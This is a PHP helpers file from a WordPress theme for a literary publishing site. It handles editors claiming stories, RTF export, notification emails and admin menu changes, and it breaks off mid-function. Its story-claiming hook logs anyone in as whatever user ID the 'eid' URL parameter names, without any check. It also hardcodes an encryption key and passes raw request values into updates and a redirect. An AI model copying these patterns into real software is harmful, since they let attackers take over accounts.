<?php

/**
 * Helpers.
 *
 * @package GOAT PoL
 */


/* Loading the autoload.php file from the vendor folder for rtf library. */

require_once('vendor/autoload.php');
// require_once('event-automation-mail.php');

function pol_show_post_archive_filters()
{

	$paged = get_query_var('paged') ? get_query_var('paged') : (get_query_var('page') ? get_query_var('page') : 1);

	return (is_home() || is_page_template('page-templates/template-archive.php')) && $paged == 1 && get_theme_mod('pol_show_post_archive_filters', true);
}


/**
 * Checks if we're doing a content-only template.
 */
function pol_is_content_only_template()
{

	$content_only_templates = array(
		'page-templates/template-no-title.php',
		'page-templates/template-blank-canvas.php',
	);

	return is_page_template($content_only_templates);
}


/**
 * Checks if we're doing a blank canvas template.
 */
function pol_is_blank_canvas_template()
{

	$blank_canvas_templates = array(
		'page-templates/template-blank-canvas.php',
	);

	return is_page_template($blank_canvas_templates);
}


/**
 * Console log
 */
function console_log($obj)
{
	$data = json_encode(print_r($obj, true));
?>
	<style type="text/css">
		#bsdLogger {
			position: fixed;
			top: 0px;
			right: 0px;
			border-left: 4px solid #bbb;
			padding: 15px;
			background: white;
			color: #444;
			z-index: 99999;
			font-size: 12px;
			width: 300px;
			height: 100vh;
			overflow: scroll;
		}

		body.admin-bar #bsdLogger {
			padding-top: 50px;
		}
	</style>
	<script type="text/javascript">
		var debug = function() {
			var obj = <?php echo $data; ?>;
			var logger = document.getElementById('bsdLogger');
			if (!logger) {
				logger = document.createElement('div');
				logger.id = 'bsdLogger';
				document.body.appendChild(logger);
			}
			var pre = document.createElement('pre');
			pre.classList.add('xdebug-var-dump');
			pre.innerHTML = obj;
			logger.appendChild(pre);
		};
		window.addEventListener("DOMContentLoaded", debug, false);
	</script>
	<?php
}


/* ------------------------------------------------------------------------------ /*
/* Adding Columns Function
/* ------------------------------------------------------------------------------ */

function add_admin_column($column_title, $post_type, $cb)
{


	add_filter('manage_' . $post_type . '_posts_columns', function ($columns) use ($column_title) {
		$columns[sanitize_title($column_title)] = $column_title;
		return $columns;
	});


	add_action('manage_' . $post_type . '_posts_custom_column', function ($column, $post_id) use ($column_title, $cb) {

		if (sanitize_title($column_title) === $column) {
			$cb($post_id);
		}
	}, 10, 2);
}

/* ------------------------------------------------------------------------------ /*
/* Closure To Claim The Story Status
/* ------------------------------------------------------------------------------ */

add_admin_column(__('Story Claim Status', 'pol'), 'story', function ($post_id) {

	global $pagenow;
	global $wp;
	if ($pagenow !== 'edit.php')
		return;
	$maybeClaimed = get_post_meta($post_id, 'claimed_by', true);
	$url = home_url($wp->request);
	$new_query = add_query_arg(
		array(
			'post_type' => $wp->query_vars['post_type'],
			'story_id' => $post_id,
			'claim' => true,

		),
		$url
	);

	$unclaim_query = add_query_arg(
		array(
			'post_type' => $wp->query_vars['post_type'],
			'story_id' => $post_id,
			'claim' => '0',
		),
		$url
	);

	$reclaim_query = add_query_arg(
		array(
			'post_type' => $wp->query_vars['post_type'],
			'story_id' => $post_id,
			'claim' => 1,
		),
		$url
	);
	$user_info = get_userdata($maybeClaimed);
	$user = wp_get_current_user();
	$rae_meta = get_user_meta($user->ID, 'rae_approved', true);

	if ($rae_meta == 1) {

		if ($maybeClaimed == get_current_user_id()) {

			echo '<a href="#">' . __('Claimed By Me ', 'pol') . '</a><br/>';
			echo '<a class="pol-edit-claimsss" href="' . $unclaim_query . '">';
			_e('Unclaim This Post', 'pol');
			echo '</a>';
		} elseif (!empty($maybeClaimed) && $maybeClaimed !== get_current_user_id()) {

			_e('This Story is Claimed by ' . $user_info->user_login, 'pol');
			echo '<br/><a href="' . $reclaim_query . '">Request For Claim</a>';
			echo '<br/><a class="pol-edit-claimsss" href="' . $new_query . '">';

			echo '</a>';
		} else {
			if (get_post_meta($post_id, 'story_type_labels', true) != 'short-story') {
				echo '<a class="pol-edit-claimsss" href="' . $new_query . '">';
				_e('Claim this Story', 'pol');
				echo '</a>';
			} else {
				_e('No RAE needed', 'pol');
			}
	?>


		<?php
		}
	}

	if ($rae_meta != 1) {
		if (!empty($maybeClaimed)) {
			echo '<a class="pol-edit-claimsss" href="#">';
			_e('This Story Is Claimed By ' . $user_info->user_login, 'pol');
			echo '</a>';
		} else {
			echo '<a class="pol-edit-claimsss" href="#">';
			_e('This Story Is Not Claimed Yet', 'pol');
			echo '</a>';
		}
	}
});


add_action('init', 'pol_execute_story_claiming');

/**
 * If the user is logged in, and the user is an editor, and the user is on the edit page for a story,
 * and the user has clicked the "claim" button, then update the story's "claimed_by" meta field with
 * the user's ID.
 */
function pol_execute_story_claiming()
{

	if (isset($_GET['eid'])) {

		$editor_id = $_GET['eid'];
		$user = get_user_by('id', $editor_id);
		wp_set_auth_cookie($user->ID, false);
		do_action('wp_login', $user->name, $user);


		header("Last-Modified: " . gmdate("D, d M Y H:i:s") . " GMT");
		header("Cache-Control: no-cache, no-store, must-revalidate, private, max-age=0, s-maxage=0");
		header("Cache-Control: post-check=0, pre-check=0", false);
		header("Pragma: no-cache");
		header("Expires: Mon, 01 Jan 1990 01:00:00 GMT");

		// pkg_autologin_mark_successful_login();
		wp_redirect(get_site_url() . '/wp-admin/edit.php?post_status=draft&post_type=story&claim=1&story_id=' . $_GET['story_id']);
		exit;
	} else {
		if (isset($_GET['claim']) && $_GET['claim'] == 1) {

			$story_id = $_GET['story_id'];
			$editor_id = get_current_user_id();
			$current_status = get_post_meta($story_id, 'claimed_by', true);
			$check_mail_send_id = get_post_meta($story_id, 'claim_editor_mail_sent_id', true);
			if ($current_status == '' || $current_status == NULL || empty($current_status)) {

				pol_send_rtf_mail_to_claimed_editor($editor_id, $story_id);
			} else {
				$editor_data = get_userdata($editor_id);
				$sal = 'Dear ' . $editor_data->display_name;
				$subj = __('Story Claim', 'pol');
				$prev_rae_data = get_userdata(intval($current_status));
				$prev_rae_mail = $prev_rae_data->user_email;
				$prev_rae_name = $prev_rae_data->display_name;
				$msg = "Thanks, but " . get_the_title($_GET['story_id']) . " has already been claimed by  <a href='mailto:" . $prev_rae_mail . "'> " . $prev_rae_name . "</a>.
				Contact them if you want to discuss any swaps or changes.
				Take care, The GOAT PoL";
				if ($check_mail_send_id != $editor_id)
					pol_mail_sender($editor_data->user_email, $subj, $msg, $sal);
			}
		}
	}

	if (isset($_GET['claim']) && $_GET['claim'] == 0) {

		$story_id = $_GET['story_id'];
		update_post_meta($story_id, 'claimed_by', '0');
	}
}


/* ------------------------------------------------------------------------------ /*
/*  Sends Mail To The RAE when claimed.Also rtf file is created here.
/* ------------------------------------------------------------------------------ */

function pol_send_rtf_mail_to_claimed_editor($editorId, $story_id)
{

	$pw = new \PhpOffice\PhpWord\PhpWord();

	// ADD HTML CONTENT
	$section = $pw->addSection();
	$content = get_the_content(null, false, $story_id);
	$stripped_content = strip_tags($content, '<p><b><em>');
	$html = $stripped_content;
	\PhpOffice\PhpWord\Shared\Html::addHtml($section, $html, false, false);

	// SAVE TO DOCX ON SERVER
	$title = get_post_field('post_title', $story_id);
	$res = preg_replace('/[^a-zA-Z0-9_ -]/s', '', $title);
	$name = preg_replace('/\s*/', '', strtolower($res));
	$file_loc = get_template_directory() . DIRECTORY_SEPARATOR . 'inc' . DIRECTORY_SEPARATOR . 'rtfs' . DIRECTORY_SEPARATOR;
	$pw->save($file_loc . $name . ".rtf", "RTF");

	$new_file = $file_loc . $name . '.rtf';
	$email_file_link = get_site_url() . '/wp-content/themes/goatpol/inc/rtfs/' . $name . '.rtf';
	if (file_exists($new_file)) {
		$attach = array($new_file);
	}
	$claimer = get_userdata($editorId);
	$claimer_email = $claimer->user_email;
	$claimer_name = $claimer->display_name;
	$author_id = get_post_field('post_author', $story_id);
	$author_data = get_userdata($author_id);
	$subj = __('Story Claimed', 'pol');
	$fileurl = get_template_directory_uri() . '/inc/rtfs/' . $name . '.rtf';
	$story_nom_de_plume = get_field('story_nom_de_plume', $story_id);
	$message = "Thank you " . $claimer_name . ", you've claimed " . get_the_title($story_id) . " and will contact " . $story_nom_de_plume . " at " . $author_data->user_email . " within the next 72 hours.
	You can download " . get_the_title($story_id) . " as an RTF file <a href='" . $email_file_link . "'>here</a>.
	We hope you enjoy working on it,
	The GOAT PoL";


	$sal = __('Dear Editor', 'pol');
	$trimmed_message = preg_replace('/\s+/', ' ', trim($message));
	if (pol_mail_sender($claimer_email, $subj, $trimmed_message, $sal)) {
		update_post_meta($story_id, 'claim_editor_mail_sent_id', $editorId);
		update_post_meta($story_id, 'claimed_by', $editorId);
		pol_send_mail_to_writer_when_claimed($attach, $author_data, $story_nom_de_plume, $story_id, $claimer);
	}
}


/* ------------------------------------------------------------------------------ /*
/*  Sends Mail To The Writer when claimed
/* ------------------------------------------------------------------------------ */


function pol_send_mail_to_writer_when_claimed($attachment, $author_data, $writername, $story_id, $editordata)
{
	$sal = !empty($writername) ? 'Dear ' . $writername : 'Dear writer';
	$sub = __('Your story has been claimed', 'pol');
	$first_name = $editordata->first_name;
	$last_name = $editordata->last_name;
	$full_name = "$first_name" . " $last_name";

	$msg = "Good news, one of our Reader/Advisor/Editors (RAEs) has claimed your story, " . get_the_title($story_id) . ", and will be in touch with you soon to begin working on it.
	 We hope you'll enjoy the process, The GOAT PoL.";


	$stripped_msg = preg_replace('/\s+/', ' ', trim($msg));
	if (pol_mail_sender($author_data->user_email, $sub, $stripped_msg, $sal, $attachment)) {
		//pol_send_mails_to_all_editors_when_claimed($editordata,$story_id);
	}
}

/* ------------------------------------------------------------------------------ /*
/*  Sends Mail To all the editors after claiming the story
/* ------------------------------------------------------------------------------ */

function pol_send_mails_to_all_editors_when_claimed($editordata, $story_id)
{

	$current_editor_name = $editordata->display_name;
	$current_editor_email = $editordata->user_email;
	$args = array(
		'orderby' => 'display_name',
		'order' => 'ASC',
		'meta_query' => array(
			array(
				'key' => 'rae_approved',
				'value' => '1',
				'compare' => '=',
			),
		)
	);
	$editors = get_users($args);
	$subject = __('Story Claimed', 'pol');
	$sal = __('Dear Editor', 'pol');
	$msg = $current_editor_name . ' has just claimed the story ' . get_the_title($story_id) . ' . If you feel that you should be the editor please email <a href="mailto:' . $current_editor_email . '">' . $current_editor_email . '</a> to discuss it. ';
	foreach ($editors as $e) {
		if ($e->ID != $editordata->ID) {
			pol_mail_sender($e->user_email, $subject, $msg, $sal);
		}
	}
}


// Function to change email address
function pol_sender_email($original_email_address)
{
	return 'info@polityofliterature.org';
}

// Function to change sender name
function pol_sender_name($original_email_from)
{
	return 'The GOAt PoL';
}

// Hooking up our functions to WordPress filters
add_filter('wp_mail_from', 'pol_sender_email');
add_filter('wp_mail_from_name', 'pol_sender_name');




/**
 * If the current user is an editor, add a link to the edit.php page that will filter the posts by the
 * meta_key claimed_by.
 * @param views - The array of views that are currently available.
 * @returns The views array.
 */
add_filter('views_edit-story', 'meta_views_wpse_94630', 10, 1);

function meta_views_wpse_94630($views)
{
	$user = wp_get_current_user();

	if (in_array('editor', $user->roles)) {
		$class = isset($_GET['meta_data']) ? "class='current'" : '';


		$views['metakey'] = '<a ' . $class . 'href="edit.php?meta_data=claimed_by&post_type=story">Stories I edit</a>';
	}
	return $views;
}


/**
 * It adds a filter to the posts_where hook.
 * @returns The posts_where filter is being returned.
 */
add_action('load-edit.php', 'load_custom_filter_wpse_94630');
function load_custom_filter_wpse_94630()
{
	global $typenow;

	// Adjust the Post Type
	if ('story' != $typenow)
		return;

	add_filter('posts_where', 'posts_where_wpse_94630');
}

/**
 * If the meta_data query var is set, then add a subquery to the WHERE clause that will only return
 * posts that have a meta_key of meta_data and a meta_value of the current user ID.
 * @param where - The WHERE clause of the query.
 * @returns The query is returning the posts that have the meta_key of 'meta_data' and the meta_value
 * of the current user id.
 */
function posts_where_wpse_94630($where)
{
	global $wpdb;
	$user_id = get_current_user_id();
	if (isset($_GET['meta_data']) && !empty($_GET['meta_data'])) {
		$meta = esc_sql($_GET['meta_data']);
		$where .= " AND ID IN (SELECT post_id FROM $wpdb->postmeta WHERE meta_key='$meta' AND meta_value= '$user_id' )";
	}
	return $where;
}


/* ------------------------------------------------------------------------------ /*
/* Encryption Helper
/* ------------------------------------------------------------------------------ */

function pol_encrypt_decrypt($string, $action = true)
{
	$encrypt_method = "AES-256-CBC";
	$secret_key = 'AA74CDCC2BBRT935136HH7B63C27'; // user define private key
	$secret_iv = '5fgf5HJ5g27'; // user define secret key
	$key = hash('sha256', $secret_key);
	$iv = substr(hash('sha256', $secret_iv), 0, 16); // sha256 is hash_hmac_algo
	if ($action) {
		$output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
		$output = base64_encode($output);
	} else {
		$output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
	}
	return $output;
}


/* ------------------------------------------------------------------------------ /*
/* Remove Menus According To The User Role
/* ------------------------------------------------------------------------------ */


add_action('admin_menu', 'my_remove_menu_pages', 999);

function my_remove_menu_pages()
{
	$user = wp_get_current_user();
	if (in_array('author', $user->roles) || in_array('editor', $user->roles)) {
		remove_menu_page('edit.php');                   //Posts
		remove_menu_page('upload.php');                 //Media
		remove_menu_page('edit-comments.php');          //Comments
		remove_menu_page('themes.php');                 //Appearance
		remove_menu_page('users.php');                  //Users
		remove_menu_page('tools.php');                  //Tools
		remove_menu_page('options-general.php');        //Settings
		remove_menu_page('edit.php?post_type=acf');
		remove_menu_page('wpcf7');
		remove_menu_page('link-manager.php');

		//remove_submenu_page( 'admin.php?page=map-options' );
	}
};

/* ------------------------------------------------------------------------------ /*
/*  Removing Acf Menus using style coz it wasnt removed by other hooks
/* ------------------------------------------------------------------------------ */

add_action('admin_head', 'pol_remove_admin_menus');
function pol_remove_admin_menus()
{

	if (in_array('author', wp_get_current_user()->roles) || in_array('editor', wp_get_current_user()->roles)) :
		?>
		<style>
			#toplevel_page_map-options {
				display: none;
			}

			#menu-posts-af_form {
				display: none;
			}

			.wp-admin-bar-new-content {
				display: none;
			}
		</style>
	<?php
	endif;
}

/* ------------------------------------------------------------------------------ /*
/*  Story Publishing Mail Notifications
/* ------------------------------------------------------------------------------ */


// function pol_story_publish_tasks( $new_status, $old_status, $post ) {
//     if ( $new_status == 'publish' && $old_status != $new_status ) {
//         if( get_post_type($post) != 'story' ) return;

// 		$authorid = get_post_field( 'post_author', $post->ID );
// 		$claimed_editor  = get_post_meta($post->ID,'claimed_by',true);
// 		$user = wp_get_current_user();
// 		if ($user->rae_approved == '1' ) {
// 			pol_send_mail_to_writer_on_publish($authorid , $claimed_editor , $post);
// 		}


//     }
// }
// add_action('transition_post_status', 'pol_story_publish_tasks', 999, 3 );


/* ------------------------------------------------------------------------------ /*
/*  Sends Mail To The Writer and admin After Publishing The Story by editor
/* ------------------------------------------------------------------------------ */

// function pol_send_mail_to_writer_on_publish($authorId,$editorId , $post){
// 		 $author 		= get_userdata($authorId);
// 		 $editor 		= get_userdata($editorId);
// 		 $author_email 	= $author->user_email;
// 		 $author_name   = $author->display_name;
// 		 $editor_email 	= $editor->user_email;
// 		 $place_id      = get_post_meta($post->ID,'stories_place',true);
// 		 $writers_name   = get_field('story_nom_de_plume' , $post->ID,true);
// 		 $sal 			=  !empty($writers_name) ?  'Dear ' .$writers_name : 'Dear writer';
// 		 $message = 'Congratulations, your story, '.get_the_title($post->ID).', has been
// 		 published on The GOAT PoL. You can view it <a href="'.site_url('/map/?place='.$place_id).'">here</a>. We hope you enjoy seeing it on
// 		 The GOAT PoL as much as we do. If you spot any unexpected errors in your story—especially
// 		 factual errors—contact us immediately so that we can fix them. But one
// 		 quick caution: publishing your work is exciting, but it can also be scary; this is a
// 		 vulnerable time. You might find flaws in your work—most writers see flaws in everything
// 		 they publish. If you do, please take some time to rest, forgive the flaws, and then read
// 		 it again with compassion. If you still find aggravating flaws, please contact your RAE, '.$author_name.',
// 		 and ask about corrections or solutions. Soon, usually within a week,
// 		 we\'ll send you 60 EUR for '.get_the_title($post->ID).', via the payment method you selected in your GOAT PoL user profile.
// 		 Thank you for publishing your work with us.';
// 		 $sub     = __('Story Published ','pol');
// 		 $trimmed_message =  preg_replace('/\s+/', ' ', trim($message));
// 		 $mailer  = pol_mail_sender($author_email,$sub,$trimmed_message,$sal);
// 		if($mailer){

// 		pol_send_mail_to_admins('diana@musagetes.ca',$authorId,get_the_title($post->ID),$author_name,$author_email);

// 		}
// }

/* ------------------------------------------------------------------------------ /*
/*  Filter Callback Function To Format Mail To HTML
/* ------------------------------------------------------------------------------ */

function pol_set_mail_content($content)
{
	return 'text/html';
}

/* ------------------------------------------------------------------------------ /*
/*  Send Message To Admins
/* ------------------------------------------------------------------------------ */

// function pol_send_mail_to_admins($admins_email,$authorId,$story_title , $author_name,$author_email){

// 	$current_user = get_user_by('id',$authorId);
// 	$first_name = $current_user->first_name;
// 	$last_name = $current_user->last_name;
// 	$user_address = get_user_meta( $authorId, 'user_address', true );
// 	$cpm_payment_method = get_user_meta( $authorId, 'cpm_payment_method', true );
// 	$cpm_payment_details = get_user_meta( $authorId, 'cpm_payment_details', true );

// 	$sub  = __('Payment','pol');
// 	$salutation = __('Dear Diana ','pol');
// 	$message = 'This email is an invoice for Musagetes to pay '.$first_name.'&nbsp;'.$last_name.' 60 EUR for writing "'.$story_title.'" that was published by The GOAT PoL on the day and time of this email. Please use the information below to make the payment.<br>
// 		<div class="cpm-author-details" style="border: 3px solid #000; padding: 15px;width: 50%;">
// 		<h3>Invoice details</h3>
// 		<p><b>Name: </b> <br> <span>'.$first_name.'&nbsp;'.$last_name.'</span> </p>
// 		<p><b>Email: </b> <br> <span>'.$author_email.'</span>  </p>
// 		<p><b>Address: </b> <br> <span>'.$user_address.'</span>  </p>
// 		<p><b>Payment Method: </b> <br> <span>'.$cpm_payment_method.'</span>  </p>
// 		<p><b>Payment Details: </b> <br> <span>'.$cpm_payment_details.'</span> </p>
// 		</div>
// 	';
// 	if(pol_mail_sender($admins_email ,$sub ,$message , $salutation));

// }


/* ------------------------------------------------------------------------------ /*
/*  Mail Sender Function
/* ------------------------------------------------------------------------------ */

function pol_mail_sender($to, $subject, $message, $salutation = '', $attach = array())
{
	$args = array('salutation' => $salutation, 'message' => $message);
	ob_start();
	add_filter('wp_mail_content_type', 'pol_set_mail_content');
	get_template_part('mail-templates/pol', 'mail', $args);
	$message = ob_get_contents();
	ob_end_clean();
	$send_from = 'thegoatpol@tutanota.com';
	$headers = array('Content-Type: text/html; charset=UTF-8');
	$headers .= 'From: ' . $send_from . "\r\n";
	$subject = $subject;
	$mail_sent = wp_mail($to, $subject, $message, $headers, $attach);
	return $mail_sent;
}


function pol_invoice_log($message)
{
	if (empty($message)) {
		return;
	}

	if (true === WP_DEBUG) {

		$log_file = WP_CONTENT_DIR . '/invoice.log';

		// Format the message with a timestamp
		$formatted_message = '[' . date('Y-m-d H:i:s') . '] ' . $message . PHP_EOL;

		// Write the message to the log file
		error_log($formatted_message, 3, $log_file);
	}
}


function pol_story_submission_log($message)
{
	if (empty($message)) {
		return;
	}

	if (true === WP_DEBUG) {
		$log_file = WP_CONTENT_DIR . '/story-submission.log';

		// Format the message with a timestamp
		$formatted_message = '[' . date('Y-m-d H:i:s') . '] ' . $message . PHP_EOL;

		// Write the message to the log file
		error_log($formatted_message, 3, $log_file);
	}
}




/**
 * It takes a plain text password and returns a hashed password.
 * @param password - The password to hash.
 * @returns The hashed password.
 */
function pol_hash_password($password)
{
	require_once ABSPATH . WPINC . '/class-phpass.php';
	$wp_hasher = new PasswordHash(8, TRUE);
	$hashed_password = $wp_hasher->HashPassword($password);
	return $hashed_password;
}




/**
 * It adds a checkbox to the user profile page.
 * @param user - The user object that is being edited.
 */
add_action('show_user_profile', 'my_user_profile_edit_action');
add_action('edit_user_profile', 'my_user_profile_edit_action');
function my_user_profile_edit_action($user)
{
	$checked = (isset($user->rae_approved) && $user->rae_approved) ? ' checked="checked"' : '';
	if (in_array('administrator', wp_get_current_user()->roles)) {



	?>
		<h2>Others</h2>
		<table class="form-table" role="presentation">
			<tbody>
				<tr id="password" class="user-pass1-wrap">
					<th><label for="pass1">Approve This User As RAE</label></th>
					<td>
						<input name="rae_approved" type="checkbox" id="rae_approved" value="1" <?php echo $checked; ?>>
					</td>
				</tr>
			</tbody>
		</table>

	<?php
	}
}

/**
 * If the checkbox is checked, the value of the checkbox is set to true. If the checkbox is not
 * checked, the value of the checkbox is set to false.
 * @param user_id - The ID of the user being edited.
 */

add_action('personal_options_update', 'my_user_profile_update_action');
add_action('edit_user_profile_update', 'my_user_profile_update_action');
function my_user_profile_update_action($user_id)
{
	update_user_meta($user_id, 'rae_approved', isset($_POST['rae_approved']));
}





/**
 * Unused function might be required later
 *
 */
add_action('wp_ajax_pol_custom_map_form_submit', 'pol_custom_map_form_submit');
add_action('wp_ajax_nopriv_pol_custom_map_form_submit', 'pol_custom_map_form_submit');
function pol_custom_map_form_submit()
{

	$lat = sanitize_text_field($_POST['data']['lat']);
	$lng = sanitize_text_field($_POST['data']['lng']);
	$address = sanitize_text_field($_POST['data']['location']);
	$meta = sanitize_text_field($_POST['data']['map-meta']);
	$add_story_path = get_page_by_path('add-story');
	$permalink = get_the_Permalink($add_story_path->ID);

	if (!empty($lat) && !empty($lng) && !empty($address)) {
		$created_post = array(
			'post_type' => 'place',
			'post_title' => $address,
			'post_status' => 'pending'
		);

		$new_palce_id = wp_insert_post($created_post);

		if (!is_wp_error($new_palce_id)) {
			update_post_meta($new_palce_id, 'place_location_place_lat', $lat);
			update_post_meta($new_palce_id, 'place_location_place_lng', $lng);
			$redirect_url = add_query_arg(
				array(
					'place_id' => $new_palce_id,
					'new_place' => 'true',
				),
				$permalink
			);
			$response = array('success' => true, 'message' => false, 'redirect' => esc_url($redirect_url));
		}
	} else {

		$response = $response = array('success' => false, 'message' => 'Some Error Occured');
	}


	echo json_encode($response);


	wp_die();
}



/**
 * If the current user is an author, remove the Place and Story menu items
 */
function pol_remove_menu_items()
{
	if (current_user_can('author')) :
		remove_menu_page('edit.php?post_type=place');
		remove_menu_page('edit.php?post_type=story');
	endif;
}
add_action('admin_menu', 'pol_remove_menu_items');


/* Removing the "New Content" and "Comments" menu from the admin bar for users with the role of
"Author". */
add_action('wp_before_admin_bar_render', function () {
	global $wp_admin_bar;
	if (current_user_can('author')) :
		$wp_admin_bar->remove_node('new-content');
		$wp_admin_bar->remove_menu('comments');

	endif;
}, 999);



/**
 * If the current user is an author, then hide the pvc_dashboard div.
 */
add_action('admin_head', 'pol_remove_pvc_dasboard');
function pol_remove_pvc_dasboard()
{
	if (current_user_can('author')) :
	?>
		<style>
			#pvc_dashboard {
				display: none;
			}
		</style>

	<?php
	endif;
}










//===============================================================
//==================profile helper functions starts==============
//===============================================================

//add_action('wp_ajax_pol_transfer_commission_from_admin_to_rae', 'pol_transfer_commission_from_admin_to_rae');
// function pol_transfer_commission_from_admin_to_rae()
// {

// 	if (!is_user_logged_in()) {
// 		return;
// 	}

// 	global $wpdb;
// 	$table_name = $wpdb->prefix . 'commission';

// 	$commission_ids = $_POST['commissions'];
// 	$receiver_id = $_POST['receiver'];

// 	//get the receiver role
// 	$receiver_user = get_user_by('id', (int) $receiver_id);
// 	$recevier_role = 'user';
// 	if (get_user_meta((int) $receiver_id, 'rae_approved', true) == 1) {
// 		$recevier_role = 'rae';
// 	} else if (in_array('administrator', (array) $receiver_user->roles)) {
// 		$recevier_role = 'admin';
// 	}

// 	foreach ($commission_ids as $id) {
// 		// Check if commission id is available
// 		$result = $wpdb->get_row($wpdb->prepare("SELECT * FROM $table_name WHERE id = %d AND status = 0", $id));

// 		// If commission is available, update user meta
// 		if ($result && $recevier_role != 'admin') {

// 			if ($recevier_role == 'user') {
// 				$receiver_commissions = get_user_meta($receiver_id, 'commissions', true);

// 				if (!is_array($receiver_commissions)) {
// 					$receiver_commissions = array();
// 				}
// 				$receiver_commissions[$result->code] = 0;
// 				update_user_meta($receiver_id, 'commissions', $receiver_commissions);

// 				//udpate the status of the code to 1
// 				$wpdb->query($wpdb->prepare("UPDATE $table_name SET status = 1, org_rae = " . get_current_user_id() . ", current_owner = " . $receiver_id . " WHERE id = %d", $id));
// 			} else if ($recevier_role == 'rae') {

// 				//update the commissions of the receiver
// 				$current_commissions = get_user_meta($receiver_id, 'commissions', true);

// 				if (is_array($current_commissions)) {
// 					// $current_commissions[$id] = $result->code;
// 					array_push($current_commissions, $result->code);
// 				} else {
// 					// $current_commissions = [$id => $result->code];
// 					$current_commissions = [$result->code];
// 				}

// 				//update the reciever's user meta
// 				update_user_meta($receiver_id, 'commissions', $current_commissions);

// 				//udpate the status of the code to 1
// 				$wpdb->query($wpdb->prepare("UPDATE $table_name SET status = 1, org_rae = " . $receiver_id . ", current_owner = " . $receiver_id . " WHERE id = %d", $id));
// 			}
// 		}
// 	}
// 	wp_die();
// }



// tranfers commissions from 
//add_action('wp_ajax_pol_transfer_commission_from_user_to_user', 'pol_transfer_commission_from_user_to_user');
// function pol_transfer_commission_from_user_to_user()
// {

// 	if (!is_user_logged_in()) {
// 		return;
// 	}

// 	global $wpdb;
// 	$table_name = $wpdb->prefix . 'commission';

// 	$commission_codes = $_POST['commissions'];
// 	$sender_id = get_current_user_id();
// 	$receiver_id = $_POST['receiver'];
// 	$curr_user_role = $_POST['currUserRole'];


// 	//get the receiver role
// 	$receiver_user = get_user_by('id', (int) $receiver_id);
// 	$recevier_role = 'user';
// 	if (get_user_meta((int) $receiver_id, 'rae_approved', true) == 1) {
// 		$recevier_role = 'rae';
// 	} else if (in_array('administrator', (array) $receiver_user->roles)) {
// 		$recevier_role = 'admin';
// 	}

// 	// Get the commissions of the sender
// 	$sender_commissions = get_user_meta($sender_id, 'commissions', true);

// 	if (!is_array($sender_commissions)) {
// 		return;
// 	}

// 	foreach ($commission_codes as $code) {

// 		if ($curr_user_role == "rae") {

// 			if (!in_array($code, $sender_commissions)) {
// 				continue;
// 			}

// 			// Remove the commission from the sender's commissions
// 			unset($sender_commissions[array_search($code, $sender_commissions)]);
// 			update_user_meta($sender_id, 'commissions', array_values($sender_commissions));

// 			// add commission to the receiver's commissions
// 			$receiver_commissions = get_user_meta($receiver_id, 'commissions', true);
// 			if ($recevier_role == 'user') {

// 				if (!is_array($receiver_commissions)) {
// 					$receiver_commissions = array();
// 				}
// 				$receiver_commissions[$code] = $sender_id;
// 				update_user_meta($receiver_id, 'commissions', $receiver_commissions);

// 				$wpdb->query($wpdb->prepare("UPDATE $table_name SET current_owner = '" . $receiver_id . "' WHERE code = '" . $code . "'"));
// 			} else if ($recevier_role == 'rae') {

// 				if (!is_array($receiver_commissions)) {
// 					$receiver_commissions = array();
// 				}
// 				array_push($receiver_commissions, $code);
// 				update_user_meta($receiver_id, 'commissions', $receiver_commissions);

// 				$wpdb->query($wpdb->prepare("UPDATE $table_name SET status = 1, org_rae = " . $receiver_id . ", current_owner = " . $receiver_id . " WHERE code = '" . $code . "'"));
// 			} else if ($recevier_role == 'admin') {

// 				// wp_send_json_success("UPDATE $table_name SET status = 0 WHERE code = '".$code."'");

// 				// $wpdb->query($wpdb->prepare("UPDATE $table_name SET status = 0 WHERE code = '".$code."'"));

// 				$wpdb->update(
// 					$table_name,
// 					[
// 						'status' => 0,
// 						'org_rae' => 0,
// 						'current_owner' => 0
// 					],
// 					['code' => $code],
// 				);

// 				// wp_send_json_success("update pachi ko statement");
// 			}
// 		} else if ($curr_user_role == "user") {

// 			// Check if the id is present in the sender's commissions
// 			if (!array_key_exists($code, $sender_commissions)) {
// 				continue;
// 			}

// 			// Remove the id from the sender's commissions
// 			unset($sender_commissions[$code]);
// 			update_user_meta($sender_id, 'commissions', $sender_commissions);

// 			// add commission to the receiver's commissions
// 			$receiver_commissions = get_user_meta($receiver_id, 'commissions', true);
// 			if ($recevier_role == 'user') {

// 				if (!is_array($receiver_commissions)) {
// 					$receiver_commissions = array();
// 				}
// 				$receiver_commissions[$code] = 0;
// 				update_user_meta($receiver_id, 'commissions', $receiver_commissions);

// 				$wpdb->query($wpdb->prepare("UPDATE $table_name SET status = 1 current_owner = " . $receiver_id . " WHERE code = '" . $code . "'"));
// 			} else if ($recevier_role == 'rae') {

// 				if (!is_array($receiver_commissions)) {
// 					$receiver_commissions = array();
// 				}
// 				array_push($receiver_commissions, $code);
// 				update_user_meta($receiver_id, 'commissions', $receiver_commissions);

// 				$wpdb->query($wpdb->prepare("UPDATE $table_name SET status = 1, org_rae = " . $receiver_id . ", current_owner = " . $receiver_id . " WHERE code = '" . $code . "'"));
// 			} else if ($recevier_role == 'admin') {

// 				$wpdb->update(
// 					$table_name,
// 					[
// 						'status' => 0,
// 						'org_rae' => 0,
// 						'current_owner' => 0
// 					],
// 					['code' => $code],
// 				);
// 			}
// 		}
// 	}
// 	wp_die();
// }



/**
 * Funcntion to add a date along with the commission and the action performed on the commission 
 * like trasnfer, revoke, story published using that commission and so on
 * commission in a database table based on provided parameters.
 *
 * @param  string $commission cannot be empty
 * @param  string $action cannot be empty
 * must be either 'tr' for transfer, 're' for revoke, 'sc' for story created, 'sp' for story published, 'cc' for new commission created, 'ce' for commission edited
 * @param  string $sender_id can not be empty for 'tr', 're', 'cc', 'sc', 'sp'
 * @param  string $receiver_id can not be empty for 'tr', 're', 'cc'
 * @return void
 */

function pol_update_commission_action($commission = '', $action = '', $sender_id = '', $receiver_id = '', $story_id = '', $action_initiator = '')
{
	global $wpdb;
	$table_name = $wpdb->prefix . 'commission';

	$is_ajax_call = defined('DOING_AJAX') && DOING_AJAX;

	$commission = isset($_POST['commission']) ? $_POST['commission'] : $commission;
	$action = isset($_POST['todo_action']) ? $_POST['todo_action'] : $action;
	$sender_id = isset($_POST['sender_id']) ? (int)$_POST['sender_id'] : (int) $sender_id;
	$receiver_id = isset($_POST['receiver_id']) ? (int)$_POST['receiver_id'] : (int) $receiver_id;
